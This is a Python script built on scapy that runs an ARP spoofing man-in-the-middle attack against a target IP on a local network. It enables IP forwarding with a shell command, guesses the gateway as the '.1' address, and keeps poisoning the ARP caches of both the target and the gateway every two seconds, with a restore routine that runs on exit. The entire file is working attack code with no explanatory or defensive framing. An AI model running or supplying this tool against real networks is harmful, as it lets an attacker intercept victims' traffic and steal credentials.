import scapy.all as scapy
import subprocess
import argparse
import sys
import time

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP SPOOF')
    parser.add_argument('-t' , '--target' , dest='target', nargs='?' , help='Specify target ip addr
ess' , required=True)
    args = parser.parse_args()
    return args


def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)                         
     broadcast   = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')       
     arp_request_broadcast = broadcast/arp_request            
     answered , unanswered = scapy.srp(arp_request_broadcast , timeout=1 , verbose=False)
     if len(answered) == 0:
         print("Invalid IP address")
         sys.exit()

     return answered[0][1].hwsrc

  

def spoof(target_ip , target_mac , src_ip):
    
    packetone = scapy.ARP(op=2 , pdst=target_ip , hwdst=target_mac , psrc=src_ip)
    scapy.send(packetone , verbose=False)


def restore(target_ip):
    ind = target_ip.find('.' , 8)
    src_ip = target_ip[0:ind] + '.1'

    packetone = scapy.ARP(op=2 , pdst=target_ip , hwdst=get_mac(target_ip) , psrc=src_ip , hwsrc=ge
t_mac(src_ip))
    scapy.send(packetone , verbose=False)

    packettwo = scapy.ARP(op=2 , pdst=src_ip , hwdst=get_mac(src_ip) , psrc=target_ip , hwsrc=get_m
ac(target_ip))
    scapy.send(packettwo , verbose=False)


result = get_arguments()
sent_packets = 0

ip_forwarding = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
subprocess.run( [ip_forwarding] ,  shell=True )
try:
    ind = result.target.find('.' , 8)
    src_ip = result.target[0:ind] + '.1'
    target_mac = get_mac(result.target)
    src_mac    = get_mac(src_ip)
    print(result.target , target_mac , src_ip , src_mac )
    print(src_ip , src_mac , result.target , target_mac)

    

    while True:    
        spoof(result.target , target_mac , src_ip  )
        spoof(src_ip  , src_mac  , result.target )
        sent_packets += 2
        print('\r[+] Packets sent: ' + str(sent_packets) , end='')
        time.sleep(2)
except:
    if sent_packets>0:
        restore(result.target)
        ip_forwarding = 'echo 0 > /proc/sys/net/ipv4/ip_forward'
        subprocess.run( [ip_forwarding] ,  shell=True ) 

    print('\n[-] Quitting')
